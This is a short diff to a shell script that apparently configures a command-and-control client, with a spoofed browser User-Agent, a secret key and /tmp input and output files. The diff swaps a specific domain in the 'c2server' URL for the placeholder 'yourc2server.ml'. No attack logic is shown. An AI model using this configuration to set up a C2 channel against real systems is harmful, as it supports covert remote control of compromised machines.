@@ -8,7 +8,7 @@ fi
 running=true
 secretkey="$1"
 user_agent="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
-c2server="http://www.dedonocuegritaria.ml/?key=$secretkey"
+c2server="http://www.yourc2server.ml/?key=$secretkey"
 result=""
 input="/tmp/input"
 output="/tmp/output"
